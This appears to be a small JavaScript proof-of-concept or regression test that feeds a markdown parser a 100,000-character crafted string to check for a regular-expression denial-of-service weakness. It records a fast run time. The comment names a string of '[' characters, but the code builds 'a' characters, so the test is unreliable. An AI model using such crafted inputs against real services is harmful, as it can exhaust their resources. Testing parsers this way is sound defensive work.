const { parse } = require("./markdown.js");

//Attack String :""+"["*100000+"]"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "a";
}
str += "]";

var result = parse(str);

// real    0m0.123s
// user    0m0.088s
// sys     0m0.020s
